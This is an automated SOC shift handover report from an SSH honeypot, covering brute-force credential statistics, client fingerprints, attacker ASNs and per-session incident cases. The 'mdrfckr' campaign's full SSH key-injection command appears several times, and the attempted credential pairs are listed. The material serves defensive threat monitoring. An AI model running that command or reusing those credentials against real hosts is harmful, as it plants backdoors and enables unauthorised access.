# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-03 |
| **Generated At** | 2026-07-03T21:12:39Z |
| **Shift Time** | 21:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **179** |
| Confirmed Threats | **106** |
| False Positives Filtered | **73** (40.8%) |
| Unique Attacker IPs | **53** |
| Countries of Origin | **14** |
| High Severity Cases | **72** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **107** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **101** |
| Unique Credential Pairs | **52** |
| Unique Usernames | **15** |
| Unique Passwords | **47** |
| Successful Auth Pairs | **85** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 48 |
| `345gs5662d34` | 16 |
| `admin` | 12 |
| `support` | 5 |
| `ubuntu` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 16 |
| `3245gs5662d34` | 15 |
| `admin` | 12 |
| `support` | 5 |
| `smo@@kkklss` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 16 |
| `admin` | `admin` | 12 |
| `root` | `3245gs5662d34` | 10 |
| `support` | `support` | 5 |
| `root` | `smo@@kkklss` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin` | `38.55.97.143` | 2026-07-03T18:56:31 |
| `root` | `Abc123321` | `119.18.55.118` | 2026-07-03T18:57:50 |
| `345gs5662d34` | `345gs5662d34` | `119.18.55.118` | 2026-07-03T18:57:54 |
| `root` | `3245gs5662d34` | `119.18.55.118` | 2026-07-03T18:57:56 |
| `root` | `aaaa8888` | `170.239.72.126` | 2026-07-03T18:59:14 |
| `345gs5662d34` | `345gs5662d34` | `170.239.72.126` | 2026-07-03T18:59:17 |
| `root` | `3245gs5662d34` | `170.239.72.126` | 2026-07-03T18:59:18 |
| `root` | `Pass@321` | `10.0.0.73` | 2026-07-03T18:59:25 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-03T18:59:30 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-03T18:59:32 |
| `ubuntu` | `asdfghj` | `45.198.224.120` | 2026-07-03T18:59:42 |
| `test` | `1234qwer` | `10.0.0.73` | 2026-07-03T19:02:23 |
| `root` | `qwe` | `185.242.3.195` | 2026-07-03T19:02:59 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-03T19:03:59 |
| `support` | `support` | `10.0.0.73` | 2026-07-03T19:04:43 |
| `guest` | `guest2024` | `10.0.0.73` | 2026-07-03T19:05:44 |
| `guest` | `3245gs5662d34` | `10.0.0.73` | 2026-07-03T19:05:49 |
| `root` | `qwe` | `10.0.0.73` | 2026-07-03T19:06:48 |
| `root` | `1q2w3e4r5T` | `10.0.0.73` | 2026-07-03T19:09:50 |
| `root` | `test321` | `95.165.68.145` | 2026-07-03T19:09:57 |
| `345gs5662d34` | `345gs5662d34` | `95.165.68.145` | 2026-07-03T19:10:00 |
| `root` | `3245gs5662d34` | `95.165.68.145` | 2026-07-03T19:10:01 |
| `root` | `00000` | `45.198.224.120` | 2026-07-03T19:11:08 |
| `root` | `---fuck_you----` | `101.96.225.252` | 2026-07-03T19:11:58 |
| `drac` | `drac123` | `159.223.156.159` | 2026-07-03T19:13:25 |
| `345gs5662d34` | `345gs5662d34` | `159.223.156.159` | 2026-07-03T19:13:26 |
| `drac` | `3245gs5662d34` | `159.223.156.159` | 2026-07-03T19:13:27 |
| `root` | `1q2w3e4r!` | `10.0.0.73` | 2026-07-03T19:14:17 |
| `root` | `Gl123456` | `10.0.0.73` | 2026-07-03T19:18:47 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-03T19:19:17 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-03T19:19:18 |
| `test` | `11` | `101.47.8.188` | 2026-07-03T19:20:28 |
| `345gs5662d34` | `345gs5662d34` | `101.47.8.188` | 2026-07-03T19:20:32 |
| `test` | `3245gs5662d34` | `101.47.8.188` | 2026-07-03T19:20:34 |
| `ubuntu` | `ubuntu123` | `45.198.224.120` | 2026-07-03T19:22:20 |
| `root` | `k` | `10.0.0.73` | 2026-07-03T19:23:20 |
| `root` | `Huawei@321` | `10.0.0.73` | 2026-07-03T19:27:57 |
| `support` | `support` | `176.53.159.196` | 2026-07-03T19:30:04 |
| `admin` | `admin` | `216.57.110.81` | 2026-07-03T19:31:24 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-03T19:31:24 |
| `nagios` | `666666` | `45.198.224.120` | 2026-07-03T19:33:38 |
| `root` | `1qaz@wsx#edc` | `10.0.0.73` | 2026-07-03T19:34:36 |
| `root` | `Rayda@2017` | `45.198.224.120` | 2026-07-03T19:44:55 |
| `root` | `valentin` | `114.217.10.60` | 2026-07-03T19:47:03 |
| `345gs5662d34` | `345gs5662d34` | `114.217.10.60` | 2026-07-03T19:47:20 |
| `root` | `adgjmptw` | `94.180.250.11` | 2026-07-03T19:52:23 |
| `345gs5662d34` | `345gs5662d34` | `94.180.250.11` | 2026-07-03T19:52:26 |
| `root` | `3245gs5662d34` | `94.180.250.11` | 2026-07-03T19:52:27 |
| `root` | `123@@@` | `140.245.50.204` | 2026-07-03T19:54:57 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-07-03T19:54:57 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-07-03T19:55:04 |
| `liangzhiqing` | `liangzhiqing` | `45.198.224.120` | 2026-07-03T19:56:27 |
| `root` | `Qaz2wsx` | `185.242.3.195` | 2026-07-03T19:58:17 |
| `west` | `123456` | `61.151.249.194` | 2026-07-03T20:02:05 |
| `ubuntu` | `ubunturoot` | `45.198.224.120` | 2026-07-03T20:08:03 |
| `root` | `rootpassword2024` | `10.0.0.73` | 2026-07-03T20:11:27 |
| `admin` | `admin` | `45.148.10.121` | 2026-07-03T20:12:23 |
| `postgres` | `q1w2e3r4t5y` | `10.0.0.73` | 2026-07-03T20:12:59 |
| `root` | `asd456789` | `10.0.0.73` | 2026-07-03T20:18:04 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-03T20:19:17 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-03T20:19:18 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-03T20:19:19 |
| `root` | `qwertuiop` | `45.198.224.120` | 2026-07-03T20:19:37 |
| `root` | `01234567890` | `14.55.144.22` | 2026-07-03T20:21:49 |
| `345gs5662d34` | `345gs5662d34` | `14.55.144.22` | 2026-07-03T20:21:53 |
| `root` | `3245gs5662d34` | `14.55.144.22` | 2026-07-03T20:21:54 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `35.203.211.10` | 2026-07-03T20:29:39 |
| `admin` | `admin` | `202.183.141.133` | 2026-07-03T20:31:02 |
| `root` | `321qwedsazxc` | `45.198.224.120` | 2026-07-03T20:31:14 |
| `admin` | `admin` | `150.109.254.122` | 2026-07-03T20:36:32 |
| `root` | `Qaz2wsx` | `10.0.0.73` | 2026-07-03T20:38:39 |
| `root` | `party` | `45.198.224.120` | 2026-07-03T20:42:47 |
| `root` | `Keshri@123` | `187.94.255.130` | 2026-07-03T20:46:09 |
| `345gs5662d34` | `345gs5662d34` | `187.94.255.130` | 2026-07-03T20:46:12 |
| `root` | `3245gs5662d34` | `187.94.255.130` | 2026-07-03T20:46:13 |
| `oracle` | `Oracle@123` | `103.243.27.155` | 2026-07-03T20:48:08 |
| `345gs5662d34` | `345gs5662d34` | `103.243.27.155` | 2026-07-03T20:48:12 |
| `oracle` | `3245gs5662d34` | `103.243.27.155` | 2026-07-03T20:48:13 |
| `daniel` | `123` | `101.47.155.9` | 2026-07-03T20:48:14 |
| `345gs5662d34` | `345gs5662d34` | `101.47.155.9` | 2026-07-03T20:48:18 |
| `daniel` | `3245gs5662d34` | `101.47.155.9` | 2026-07-03T20:48:20 |
| `root` | `Aa123456#` | `118.194.234.8` | 2026-07-03T20:52:45 |
| `345gs5662d34` | `345gs5662d34` | `118.194.234.8` | 2026-07-03T20:52:49 |
| `root` | `3245gs5662d34` | `118.194.234.8` | 2026-07-03T20:52:51 |
| `ubuntu` | `q1w2e3` | `45.198.224.120` | 2026-07-03T20:54:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **179** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 50 |
| Go SSH scanner | 21 |
| Paramiko (Python) | 10 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 29 | 12 |
| `16443846184e...` | Generic scanner | 14 | 2 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |
| `03a80b21afa8...` | Modern SSH client | 8 | 4 |
| `af8223ac9914...` | libssh-based | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 29 | 12 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 14 | 2 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `03a80b21afa8...` | libssh | 8 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `e37f354a101a...` | libssh | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 12 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `94.180.250.11`, `118.194.234.8`, `103.243.27.155`, `187.94.255.130`, `170.239.72.126`, `114.217.10.60`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **53** |
| Unique ASNs | **37** |
| High-Risk ASNs | **33** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 6 | LOW |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS150436` | Byteplus Pte. Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (71)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f257186b3d3c

| Field | Detail |
|---|---|
| **Source IP** | `38.55.97[.]143` |
| **First Seen** | 2026-07-03 18:55 |
| **Last Seen** | 2026-07-03 18:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:55:26` | `cowrie.session.connect` |
| `2026-07-03 18:55:27` | `cowrie.telnet.option` |
| `2026-07-03 18:55:28` | `cowrie.telnet.option` |
| `2026-07-03 18:56:31` | `cowrie.login.success` |
| `2026-07-03 18:56:32` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `38.55.97[.]143` to AbuseIPDB if not already reported
- [ ] Block `38.55.97[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37a480fb25bd

| Field | Detail |
|---|---|
| **Source IP** | `119.18.55[.]118` |
| **First Seen** | 2026-07-03 18:57 |
| **Last Seen** | 2026-07-03 18:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:57:49` | `cowrie.session.connect` |
| `2026-07-03 18:57:49` | `cowrie.client.version` |
| `2026-07-03 18:57:49` | `cowrie.client.kex` |
| `2026-07-03 18:57:50` | `cowrie.login.success` |
| `2026-07-03 18:57:51` | `cowrie.session.params` |
| `2026-07-03 18:57:51` | `cowrie.command.input` |
| `2026-07-03 18:57:51` | `cowrie.command.failed` |
| `2026-07-03 18:57:52` | `cowrie.log.closed` |
| `2026-07-03 18:57:53` | `cowrie.session.params` |
| `2026-07-03 18:57:53` | `cowrie.command.input` |
| `2026-07-03 18:57:53` | `cowrie.session.file_download` |
| `2026-07-03 18:57:53` | `cowrie.log.closed` |
| `2026-07-03 18:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.18.55[.]118` to AbuseIPDB if not already reported
- [ ] Block `119.18.55[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa2624ac984e

| Field | Detail |
|---|---|
| **Source IP** | `119.18.55[.]118` |
| **First Seen** | 2026-07-03 18:57 |
| **Last Seen** | 2026-07-03 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:57:53` | `cowrie.session.connect` |
| `2026-07-03 18:57:53` | `cowrie.client.version` |
| `2026-07-03 18:57:53` | `cowrie.client.kex` |
| `2026-07-03 18:57:54` | `cowrie.login.success` |
| `2026-07-03 18:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.18.55[.]118` to AbuseIPDB if not already reported
- [ ] Block `119.18.55[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8286e5363016

| Field | Detail |
|---|---|
| **Source IP** | `119.18.55[.]118` |
| **First Seen** | 2026-07-03 18:57 |
| **Last Seen** | 2026-07-03 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:57:55` | `cowrie.session.connect` |
| `2026-07-03 18:57:55` | `cowrie.client.version` |
| `2026-07-03 18:57:55` | `cowrie.client.kex` |
| `2026-07-03 18:57:56` | `cowrie.login.success` |
| `2026-07-03 18:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.18.55[.]118` to AbuseIPDB if not already reported
- [ ] Block `119.18.55[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e03d0ac616d4

| Field | Detail |
|---|---|
| **Source IP** | `170.239.72[.]126` |
| **First Seen** | 2026-07-03 18:59 |
| **Last Seen** | 2026-07-03 18:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:59:14` | `cowrie.session.connect` |
| `2026-07-03 18:59:14` | `cowrie.client.version` |
| `2026-07-03 18:59:14` | `cowrie.client.kex` |
| `2026-07-03 18:59:14` | `cowrie.login.success` |
| `2026-07-03 18:59:15` | `cowrie.session.params` |
| `2026-07-03 18:59:15` | `cowrie.command.input` |
| `2026-07-03 18:59:15` | `cowrie.command.failed` |
| `2026-07-03 18:59:15` | `cowrie.log.closed` |
| `2026-07-03 18:59:16` | `cowrie.session.params` |
| `2026-07-03 18:59:16` | `cowrie.command.input` |
| `2026-07-03 18:59:16` | `cowrie.session.file_download` |
| `2026-07-03 18:59:16` | `cowrie.log.closed` |
| `2026-07-03 18:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.239.72[.]126` to AbuseIPDB if not already reported
- [ ] Block `170.239.72[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c09d9968cbbd

| Field | Detail |
|---|---|
| **Source IP** | `170.239.72[.]126` |
| **First Seen** | 2026-07-03 18:59 |
| **Last Seen** | 2026-07-03 18:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:59:17` | `cowrie.session.connect` |
| `2026-07-03 18:59:17` | `cowrie.client.version` |
| `2026-07-03 18:59:17` | `cowrie.client.kex` |
| `2026-07-03 18:59:17` | `cowrie.login.success` |
| `2026-07-03 18:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.239.72[.]126` to AbuseIPDB if not already reported
- [ ] Block `170.239.72[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b11e6d09a11b

| Field | Detail |
|---|---|
| **Source IP** | `170.239.72[.]126` |
| **First Seen** | 2026-07-03 18:59 |
| **Last Seen** | 2026-07-03 18:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:59:18` | `cowrie.session.connect` |
| `2026-07-03 18:59:18` | `cowrie.client.version` |
| `2026-07-03 18:59:18` | `cowrie.client.kex` |
| `2026-07-03 18:59:18` | `cowrie.login.success` |
| `2026-07-03 18:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.239.72[.]126` to AbuseIPDB if not already reported
- [ ] Block `170.239.72[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07bce537506a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 18:59 |
| **Last Seen** | 2026-07-03 18:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:59:34` | `cowrie.session.connect` |
| `2026-07-03 18:59:36` | `cowrie.client.version` |
| `2026-07-03 18:59:36` | `cowrie.client.kex` |
| `2026-07-03 18:59:42` | `cowrie.login.success` |
| `2026-07-03 18:59:46` | `cowrie.session.params` |
| `2026-07-03 18:59:46` | `cowrie.command.input` |
| `2026-07-03 18:59:47` | `cowrie.log.closed` |
| `2026-07-03 18:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51ffe15cd6cc

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 19:02 |
| **Last Seen** | 2026-07-03 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:02:58` | `cowrie.session.connect` |
| `2026-07-03 19:02:58` | `cowrie.client.version` |
| `2026-07-03 19:02:58` | `cowrie.client.kex` |
| `2026-07-03 19:02:59` | `cowrie.login.success` |
| `2026-07-03 19:02:59` | `cowrie.session.params` |
| `2026-07-03 19:02:59` | `cowrie.command.input` |
| `2026-07-03 19:02:59` | `cowrie.log.closed` |
| `2026-07-03 19:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dc249cbca5b

| Field | Detail |
|---|---|
| **Source IP** | `95.165.68[.]145` |
| **First Seen** | 2026-07-03 19:09 |
| **Last Seen** | 2026-07-03 19:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:09:57` | `cowrie.session.connect` |
| `2026-07-03 19:09:57` | `cowrie.client.version` |
| `2026-07-03 19:09:57` | `cowrie.client.kex` |
| `2026-07-03 19:09:57` | `cowrie.login.success` |
| `2026-07-03 19:09:58` | `cowrie.session.params` |
| `2026-07-03 19:09:58` | `cowrie.command.input` |
| `2026-07-03 19:09:58` | `cowrie.command.failed` |
| `2026-07-03 19:09:58` | `cowrie.log.closed` |
| `2026-07-03 19:09:59` | `cowrie.session.params` |
| `2026-07-03 19:09:59` | `cowrie.command.input` |
| `2026-07-03 19:09:59` | `cowrie.session.file_download` |
| `2026-07-03 19:09:59` | `cowrie.log.closed` |
| `2026-07-03 19:10:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.165.68[.]145` to AbuseIPDB if not already reported
- [ ] Block `95.165.68[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c70e4f1a6d89

| Field | Detail |
|---|---|
| **Source IP** | `95.165.68[.]145` |
| **First Seen** | 2026-07-03 19:10 |
| **Last Seen** | 2026-07-03 19:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:10:00` | `cowrie.session.connect` |
| `2026-07-03 19:10:00` | `cowrie.client.version` |
| `2026-07-03 19:10:00` | `cowrie.client.kex` |
| `2026-07-03 19:10:00` | `cowrie.login.success` |
| `2026-07-03 19:10:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.165.68[.]145` to AbuseIPDB if not already reported
- [ ] Block `95.165.68[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-397d956c910d

| Field | Detail |
|---|---|
| **Source IP** | `95.165.68[.]145` |
| **First Seen** | 2026-07-03 19:10 |
| **Last Seen** | 2026-07-03 19:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:10:00` | `cowrie.session.connect` |
| `2026-07-03 19:10:00` | `cowrie.client.version` |
| `2026-07-03 19:10:01` | `cowrie.client.kex` |
| `2026-07-03 19:10:01` | `cowrie.login.success` |
| `2026-07-03 19:10:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.165.68[.]145` to AbuseIPDB if not already reported
- [ ] Block `95.165.68[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77ce6c4166bf

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 19:11 |
| **Last Seen** | 2026-07-03 19:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:11:02` | `cowrie.session.connect` |
| `2026-07-03 19:11:04` | `cowrie.client.version` |
| `2026-07-03 19:11:04` | `cowrie.client.kex` |
| `2026-07-03 19:11:08` | `cowrie.login.success` |
| `2026-07-03 19:11:11` | `cowrie.session.params` |
| `2026-07-03 19:11:11` | `cowrie.command.input` |
| `2026-07-03 19:11:12` | `cowrie.log.closed` |
